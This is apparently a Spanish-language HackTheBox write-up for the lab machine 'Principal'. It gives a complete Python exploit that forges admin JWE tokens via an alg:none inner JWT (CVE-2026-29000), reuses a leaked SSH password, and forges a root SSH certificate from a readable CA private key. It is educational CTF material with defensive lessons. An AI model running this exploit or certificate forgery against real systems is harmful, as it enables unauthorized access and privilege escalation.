---
title: "Principal"
date: 2026-06-18
categories: [HackTheBox, Medium]
tags: [linux, ssh, JWT, scripting, CA private key, CVE, CVE-2026-29000]
image:
  path: /assets/img/HTB/Principal/banner.png
  alt: Principal writeup
---


Plataforma interna Java/Jetty protegida por pac4j-jwt 6.0.3, vulnerable a **CVE-2026-29000** — un envoltorio JWE alrededor de un `PlainJWT` (alg:none) sortea por completo la verificación de firma, concediendo acceso `ROLE_ADMIN` falsificado y exponiendo credenciales SSH reutilizables en el panel de administración. Escalada de privilegios mediante una mala configuración de la user-CA de SSH: el grupo `deployers` tiene acceso de lectura sobre la clave privada de la CA en la que confía sshd, lo que permite falsificar certificados para principals arbitrarios, incluido `root`.

| Campo      | Detalles            |
|------------|---------------------|
| Plataforma | HackTheBox          |
| Dificultad | Fácil               |
| SO         | Linux               |
| IP         | 10.129.27.127       |
| Fecha      | Junio 2026          |


## Herramientas utilizadas

| Herramienta           | Descripción                                                                          |
|-----------------------|--------------------------------------------------------------------------------------|
| ping                  | Utilidad ICMP para verificar la accesibilidad del host                              |
| nmap                  | Escáner de puertos e identificación de servicios                                     |
| Navegador web         | Exploración manual de la aplicación web e inspección del código fuente               |
| Python 3 (jwcrypto)   | Usado para construir el PlainJWT y envolverlo dentro de un JWE válido               |
| Browser DevTools      | Para inyectar el token falsificado en `sessionStorage` y recargar como admin         |
| ssh                   | Cliente OpenSSH para el acceso inicial (contraseña) y la escalada (certificado)      |
| find                  | Usado para enumerar objetos del sistema de archivos propiedad del grupo `deployers`  |
| ssh-keygen            | Usado tanto para generar un par de claves RSA nuevo como para firmarlo con la user-CA capturada |

## Reconocimiento y enumeración

El objetivo de esta fase era mapear la superficie de ataque e identificar qué servicio exponía un punto de entrada.

### Descubrimiento del host

La accesibilidad se confirmó con ICMP. El TTL de 63 (el TTL por defecto en Linux es 64, decrementado una vez al cruzar el salto de enrutamiento) dio una pista temprana del SO:

```bash
ping -c 1 10.129.27.127
PING 10.129.27.127 (10.129.27.127) 56(84) bytes of data.
64 bytes from 10.129.27.127: icmp_seq=1 ttl=63 time=43.9 ms
```

### Escaneo de puertos

Un escaneo SYN sobre los 65535 puertos TCP a alta velocidad de paquetes. `-Pn` saltó el descubrimiento de host (ICMP ya confirmó que estaba vivo) y `-n` deshabilitó el DNS inverso:

```bash
sudo nmap -p- --min-rate 5000 -sS -vvv -Pn -n 10.129.27.127 -oG allPorts
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63
```

Solo respondieron dos puertos — SSH y un servicio HTTP no estándar en el 8080. Le siguió un escaneo dirigido con los scripts por defecto y detección de versiones:

```bash
sudo nmap -p22,8080 -sCV 10.129.27.127 -oN nmap
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
8080/tcp open  http-proxy Jetty
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
|_http-server-header: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
```

Tres detalles destacaron de inmediato. El servidor web es **Jetty** (Java), la aplicación se titula *Principal Internal Platform*, y — lo más importante — las cabeceras de respuesta filtraban el **framework de autenticación y su versión exacta**: **`pac4j-jwt/6.0.3`**. La cabecera `X-Powered-By` en un componente crítico para la seguridad es en sí misma una pequeña fuga de información, pero el valor real es el pin preciso de versión: nos permite buscar CVE conocidas de inmediato en lugar de hacer fingerprinting por comportamiento.

### Aplicación web

Navegar a `http://10.129.27.127:8080/` redirigía a `/login`.

pac4j-jwt 6.0.3 está afectado por **CVE-2026-29000**, un fallo de pre-autenticación en cómo la biblioteca maneja las construcciones anidadas JWT-en-JWE. Antes de elaborar un exploit valía la pena entender cómo usa la aplicación el framework, así que inspeccioné el bundle del lado del cliente en `/static/app.js`. El bloque relevante era un comentario de desarrollador documentando todo el esquema de tokens:

```javascript
/**
 * Authentication flow:
 * 1. User submits credentials to /api/auth/login
 * 2. Server returns encrypted JWT (JWE) token
 * 3. Token is stored and sent as Bearer token for subsequent requests
 *
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks for token verification
 * - Inner JWT is signed with RS256
 *
 * JWT claims schema:
 *   sub   - username
 *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
 *   iss   - "principal-platform"
 *   iat   - issued at (epoch)
 *   exp   - expiration (epoch)
 */
```

Esto es todo lo que un atacante necesita en lenguaje claro: el algoritmo exacto de wrapping de la clave JWE (`RSA-OAEP-256`), el algoritmo de firma del JWT interno (`RS256`), la URL de la clave pública (`/api/auth/jwks`) y el esquema completo de claims (`sub`, `role`, `iss`, `iat`, `exp`) — incluidos los valores de rol válidos. Con esto en la mano, explotar CVE-2026-29000 es solo cuestión de producir un token cuyo payload interno diga `role: ROLE_ADMIN`.

## Explotación

### CVE-2026-29000 — un JWE que envuelve un PlainJWT sortea la verificación de firma

pac4j-jwt 6.0.3 acepta tokens cuyo sobre externo es un JWE válido (cifrado con la clave pública RSA del servidor) y cuyo payload interno es, según el diseño, un JWT RS256 firmado. La vulnerabilidad es que la biblioteca **no** requiere que el payload interno sea un JWT firmado — acepta un **`PlainJWT`** (un JWT con `alg: none` en su cabecera y un segmento de firma vacío). Como el JWE externo se descifró con éxito con la clave privada del servidor, la biblioteca trata el texto plano resultante como auténtico y confía en los claims **sin verificar ninguna firma**.

El atacante por tanto solo necesita tres cosas:

1. La **clave pública RSA** del servidor (publicada en `/api/auth/jwks` con fines de verificación de tokens — pero es la misma clave necesaria para el cifrado JWE).
2. El **esquema de claims** (ya documentado en el comentario de app.js).
3. Una biblioteca que pueda construir un JWT sin firma y envolverlo en un JWE — el `jwcrypto` de Python maneja ambos.

La PoC completa construye el PlainJWT manualmente (cabecera `{"alg":"none"}`, los claims de admin deseados, firma vacía) y luego lo cifra dentro de un JWE usando la clave pública RSA del servidor obtenida del endpoint JWKS:

```python
#!/usr/bin/env python3
"""
CVE-2026-29000 - pac4j-jwt JWE PlainJWT Authentication Bypass
Target: Principal Internal Platform
"""
import json
import time
import base64
import requests
from jwcrypto import jwk, jwt as jwcrypto_jwt

TARGET = "http://10.129.27.127:8080"

# ── helpers ──────────────────────────────────────────────────────────────────
def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def build_plain_jwt(claims: dict) -> str:
    """Construye un PlainJWT (alg: none) sin firma."""
    header  = b64url_encode(json.dumps({"alg": "none"}, separators=(",", ":")).encode())
    payload = b64url_encode(json.dumps(claims,           separators=(",", ":")).encode())
    return f"{header}.{payload}."

# ── paso 1: obtener JWKS ─────────────────────────────────────────────────────
print("[*] Fetching JWKS...")
jwks_resp = requests.get(f"{TARGET}/api/auth/jwks")
jwks_resp.raise_for_status()
jwks_data = jwks_resp.json()
print(f"[+] JWKS: {json.dumps(jwks_data, indent=2)}")

pub_key = jwk.JWK(**jwks_data["keys"][0])

# ── paso 2: construir el PlainJWT con claims de admin ────────────────────────
now = int(time.time())
claims = {
    "sub":  "admin",
    "role": "ROLE_ADMIN",
    "iss":  "principal-platform",
    "iat":  now,
    "exp":  now + 86400
}

plain_token = build_plain_jwt(claims)
print(f"\n[*] PlainJWT (alg:none):\n    {plain_token}")

# ── paso 3: envolver el PlainJWT en un JWE ───────────────────────────────────
token = jwcrypto_jwt.JWT(
    header={
        "alg": "RSA-OAEP-256",
        "enc": "A128GCM",
        "kid": pub_key.key_id
    },
    claims=plain_token
)
token.make_encrypted_token(pub_key)
forged = token.serialize()

print(f"\n[+] Forged JWE token:\n    {forged}")

# ── paso 4: probar el token ───────────────────────────────────────────────────
headers = {"Authorization": f"Bearer {forged}"}

print("\n[*] Testing /api/dashboard...")
r = requests.get(f"{TARGET}/api/dashboard", headers=headers)
print(f"    Status: {r.status_code}")
if r.ok:
    print(f"    Response: {json.dumps(r.json(), indent=2)}")

print("\n[*] Testing /api/users (admin-only)...")
r = requests.get(f"{TARGET}/api/users", headers=headers)
print(f"    Status: {r.status_code}")
if r.ok:
    print(f"    Response: {json.dumps(r.json(), indent=2)}")

print("\n[*] Testing /api/settings (admin-only)...")
r = requests.get(f"{TARGET}/api/settings", headers=headers)
print(f"    Status: {r.status_code}")
if r.ok:
    print(f"    Response: {json.dumps(r.json(), indent=2)}")
```

El detalle crítico es el valor que se pasa como argumento `claims` a `jwcrypto_jwt.JWT`: **no** es un dict de Python (que produciría un JWT-en-JWE anidado normal), es la cadena `PlainJWT` en crudo con `alg: none`. La biblioteca envuelve encantada esa cadena verbatim como el texto plano del JWE, que es exactamente la construcción que CVE-2026-29000 explota — un sobre JWE válido cuyo payload interno es un JWT sin firma.

Ejecutarlo contra el objetivo produce la obtención del JWKS, el PlainJWT y el JWE falsificado final de un tirón:

```bash
python3 exploit.py
[*] Fetching JWKS...
[+] JWKS: {
  "keys": [
    {
      "kty": "RSA",
      "use": "enc",
      "kid": "enc-key-1",
      "alg": "RSA-OAEP-256",
      "n": "...",
      "e": "AQAB"
    }
  ]
}

[*] PlainJWT (alg:none):
    eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJST0xFX0FETUlOIiwiaXNzIjoicHJpbmNpcGFsLXBsYXRmb3JtIiwiaWF0IjoxNzUwMjUyOTM2LCJleHAiOjE3NTAzMzkzMzZ9.

[+] Forged JWE token:
    eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJlbmMiOiJBMTI4R0NNIiwia2lkIjoiZW5jLWtleS0xIn0.W76r68f1pIJILTiTdL47YydEebrhDjvDCoT2NUv7PaNG8ZAaT02zFxLrbMFVdzCmxv5be...TRUNCATED...kZXMp38DTKKQvTh.xT5_Ssu7GxVlSf9vEo4_lA
```

Fíjate en cómo el PlainJWT termina con un punto final y sin datos de firma — ese es el payload `alg: none` que nunca debería haberse aceptado, pero pac4j-jwt 6.0.3 lo lee como legítimo tras descifrar el JWE con éxito. La cabecera JWE externa decodifica a `{"alg":"RSA-OAEP-256","enc":"A128GCM","kid":"enc-key-1"}` — un sobre perfectamente válido que no le da a la biblioteca ninguna razón para marcar la petición.

### Inyectando el token falsificado

Del mismo `app.js`, el `TokenManager` del lado del cliente almacena el JWT en `sessionStorage` bajo la clave `auth_token` y lo envía como cabecera `Bearer` en cada llamada a la API. No hay cookie firmada, ni sesión del lado del servidor — todo el estado de autenticación vive en ese único token.

Eso hizo la inyección trivial. En el navegador, tras navegar a la página de login, abrí DevTools y ejecuté:

```javascript
sessionStorage.setItem('auth_token', '<forged JWE>')
location.href = '/dashboard'
```

El dashboard cargó completamente como `admin / ROLE_ADMIN` — la llamada `renderNavigation()` de `app.js` renderizó las entradas de navegación *Users* y *Settings* que están limitadas a `ROLES.ADMIN`, y el resto del panel se rellenó desde `/api/dashboard` sin ningún desafío de autenticación adicional.

### Botín del panel de administración

Una vez dentro, dos pantallas fueron inmediatamente útiles.

**Settings → panel de seguridad** reveló varios valores de configuración internos. El campo interesante era `encryptionKey`, cuyo valor era una contraseña obvia más que la clave simétrica que sugería su etiqueta:

![Settings panel exposing encryptionKey value](/assets/img/HTB/Principal/web2.png)

```text
encryptionKey: D3pl0y_$$H_Now42!
```

El valor `D3pl0y_$$H_Now42!` se lee fonéticamente como *Deploy SSH Now* — insinuando con fuerza que la misma cadena se usa como contraseña SSH de una cuenta de servicio en algún punto de la máquina. Esa hipótesis recibió corroboración inmediata del siguiente panel.

**Panel de usuarios** listaba cada cuenta de la aplicación con su rol, departamento y una columna *Notes* de texto libre:

![Users table revealing the svc-deploy service account](/assets/img/HTB/Principal/web3.png))

La entrada destacada era **`svc-deploy`** con rol `deployer` y la nota *"Service account for automated deployments via SSH certificate auth."* — una cuenta de sistema descrita específicamente como con acceso SSH. El patrón del nombre coincide con la pista de la credencial filtrada (*Deploy*), así que reutilizar la credencial contra SSH en esa cuenta era la prueba obvia:

```bash
ssh svc-deploy@10.129.27.127
svc-deploy@10.129.27.127's password: D3pl0y_$$H_Now42!
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
svc-deploy@principal:~$
```

Reutilización de credenciales confirmada — la misma cadena hacía doble función como ajuste `encryptionKey` en el panel de admin y como contraseña SSH de la cuenta Linux `svc-deploy`. La flag de usuario era legible desde el directorio home de `svc-deploy`:

```bash
cat user.txt
```

## Escalada de privilegios — `svc-deploy` → `root`

Con una shell como `svc-deploy`, empezó la enumeración estándar de escalada de privilegios. Lo primero que destacó fue la pertenencia a grupos del usuario:

```bash
id
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```

El grupo personalizado `deployers` es exactamente el tipo de grupo no estándar que a menudo controla el acceso a archivos sensibles de infraestructura. El siguiente paso natural es encontrar cada objeto del sistema de archivos propiedad de ese grupo:

```bash
find / -group deployers 2>/dev/null
/etc/ssh/sshd_config.d/60-principal.conf
/opt/principal/ssh
/opt/principal/ssh/README.txt
/opt/principal/ssh/ca
```

Cuatro aciertos, y los nombres por sí solos insinuaban con fuerza una infraestructura de autenticación SSH basada en certificados. Comprobé primero el drop-in de configuración de sshd, porque me diría qué rol juega realmente `/opt/principal/ssh/ca` para el servicio SSH:

```bash
cat /etc/ssh/sshd_config.d/60-principal.conf
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

Esta es la mala configuración central. La directiva **`TrustedUserCAKeys /opt/principal/ssh/ca.pub`** le dice a sshd que **confíe en cualquier certificado de usuario firmado por esa CA** — lo que significa que cualquiera que tenga la clave *privada* de la CA puede acuñar un certificado SSH válido para cualquier principal que la CA elija autorizar, incluido `root`. Combinado con `PermitRootLogin prohibit-password` (que prohíbe la autenticación por contraseña para root pero **permite explícitamente la autenticación por clave/certificado**), el sistema está a una clave privada robada de un acceso root sin restricciones.

El README confirmó el flujo de trabajo previsto, que es benigno sobre el papel:

```bash
cat /opt/principal/ssh/README.txt
CA keypair for SSH certificate automation.
This CA is trusted by sshd for certificate-based authentication.
Use deploy.sh to issue short-lived certificates for service accounts.
Key details:
  Algorithm: RSA 4096-bit
  Created: 2025-11-15
  Purpose: Automated deployment authentication
```

La arquitectura en sí está bien — los certificados SSH de vida corta emitidos por una CA son una buena práctica común para despliegues automatizados. El error está en los permisos del archivo. Listar el directorio de la CA reveló el bug real:

```bash
ls -la /opt/principal/ssh
total 20
drwxr-x--- 2 root deployers 4096 Mar 11 04:22 .
drwxr-xr-x 5 root root      4096 Mar 11 04:22 ..
-rw-r----- 1 root deployers  288 Mar  5 21:05 README.txt
-rw-r----- 1 root deployers 3381 Mar  5 21:05 ca
-rw-r--r-- 1 root root       742 Mar  5 21:05 ca.pub
```

La **clave privada** de la CA (`ca`, modo `640`) es legible por el grupo `deployers`, y `svc-deploy` es miembro de ese grupo. La clave privada de la CA solo debería ser legible por el servicio emisor corriendo como un usuario dedicado y restringido — exponerla a cada miembro de un grupo compartido significa que cada uno de esos miembros tiene efectivamente root sin restricciones.

### Falsificando un certificado de root

Con acceso de lectura a la clave privada de la CA, falsificar un certificado de usuario SSH para `root` es un procedimiento de tres pasos usando solo invocaciones estándar de `ssh-keygen`.

Primero, generar un par de claves RSA nuevo en local. Este es el par de claves cuya mitad pública le pediremos a la CA que firme:

```bash
ssh-keygen -t rsa -b 4096 -f id_forged -N ""
Generating public/private rsa key pair.
Your identification has been saved in id_forged
Your public key has been saved in id_forged.pub
The key fingerprint is:
SHA256:0S+Uh9CESo17agvwD9DXtL0cyEj9x6A8EPIJywUNJeM svc-deploy@principal
```

Segundo, firmar la mitad pública con la CA, especificando los principals (nombres de usuario con los que el certificado está autorizado a iniciar sesión) y un periodo de validez:

```bash
ssh-keygen -s /opt/principal/ssh/ca -I "principal-cert" -n root,admin,deploy,principal -V +1d id_forged.pub
Signed user key id_forged-cert.pub: id "principal-cert" serial 0 for root,admin,deploy,principal valid from 2026-06-18T15:00:00 to 2026-06-19T15:00:00
```

Los flags se desglosan así. `-s /opt/principal/ssh/ca` selecciona la clave privada de la CA para firmar — este es el archivo que `svc-deploy` nunca debería haber podido leer. `-I "principal-cert"` establece una cadena identificadora de texto libre con fines de logging; no tiene peso de seguridad. `-n root,admin,deploy,principal` es el flag crítico para la seguridad: lista cada principal (nombre de usuario) con el que el certificado está autorizado a autenticarse, e incluir `root` aquí es lo que convierte la falsificación en escalada de privilegios. `-V +1d` acota la validez a 24 horas, lo que evita activar cualquier monitorización que marque certificados sospechosamente longevos.

La salida es `id_forged-cert.pub` — el certificado firmado, que `ssh` recogerá automáticamente cuando se invoque con `-i id_forged` porque vive junto a la clave privada.

Tercero, usar el certificado para entrar por SSH como root, contra el sshd local (que confía en la CA):

```bash
ssh -i id_forged root@127.0.0.1
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
Last login: Thu Jun 18 15:08:35 2026 from 127.0.0.1
root@principal:~# cat root.txt
```

sshd aceptó la conexión porque el certificado presentado estaba firmado por `/opt/principal/ssh/ca.pub` (declarado de confianza en `60-principal.conf`) y listaba `root` entre sus principals válidos.

## Flags

| Flag     | Valor      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Conclusiones clave

- **La cabecera `X-Powered-By` rara vez compensa la comodidad operativa.** Fijar la versión exacta de un framework de autenticación le da al atacante la búsqueda precisa de CVE que necesita antes incluso de haber iniciado sesión. El propio bundle de JavaScript de la aplicación además ofreció voluntariamente todo el esquema de tokens en un comentario, eliminando cada incógnita restante.
- **Descifrar no es autenticar.** CVE-2026-29000 se apoya en un error conceptual recurrente en los diseños de tokens anidados: descifrar con éxito un JWE con la clave privada del destinatario solo prueba que el emisor conocía la clave pública (que es pública), no que el emisor posea nada secreto. La firma del JWT interno es lo único que autentica los claims, y cualquier ruta de código que acepte un JWT interno sin firma está fatalmente rota independientemente de lo fuerte que sea la cripto del sobre externo.
- **Las etiquetas de las credenciales mienten.** Un campo llamado `encryptionKey` en un panel de ajustes de admin resultó ser la contraseña SSH de una cuenta de servicio. Los paneles de admin exponen rutinariamente secretos por comodidad operativa, y el desajuste entre el propósito declarado de una credencial y su reutilización real es precisamente el tipo de hueco que los atacantes buscan. Hay que asumir que la presencia de cualquier cadena con aspecto reutilizable en una UI privilegiada es comprometedora.
- **Las user-CA de SSH concentran la confianza.** `TrustedUserCAKeys` es un mecanismo potente y legítimo, pero una clave privada de CA tiene la misma autoridad efectiva que una clave root sin contraseña para cada host que confía en ella. El modo correcto es `0600 root:root` y la superficie de exposición correcta es exactamente un servicio corriendo como un usuario dedicado. Conceder a un grupo compartido como `deployers` acceso de lectura sobre la mitad privada es funcionalmente equivalente a entregar a cada miembro del grupo un login root sin contraseña en cada máquina del ámbito de confianza.
